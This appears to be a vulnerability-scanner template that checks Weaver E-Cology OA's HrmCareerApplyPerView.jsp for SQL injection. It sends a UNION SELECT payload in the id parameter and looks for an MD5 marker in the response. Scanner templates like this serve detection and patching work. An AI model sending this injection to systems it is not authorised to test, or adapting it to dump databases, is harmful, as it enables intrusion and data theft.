id: weaver-ecology-hrmcareer-sqli
brief:
    title: Weaver E-Cology HrmCareerApplyPerView - SQL Injection
    by: SleepingBag945
    level: high
    about: There is a SQL injection vulnerability in the HrmCareerApplyPerView.jsp file of Panwei OA E-Cology. An attacker can obtain sensitive files in the server database through the vulnerability.
    label:
        - ecology
        - weaver
        - oa
        - sqli
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''{{num}}'')),4,5,6,7'
      signs:
        - "on": word
          has:
            - '{{md5(num)}}'
          in: body
          need: all
        - "on": status
          status:
            - 200
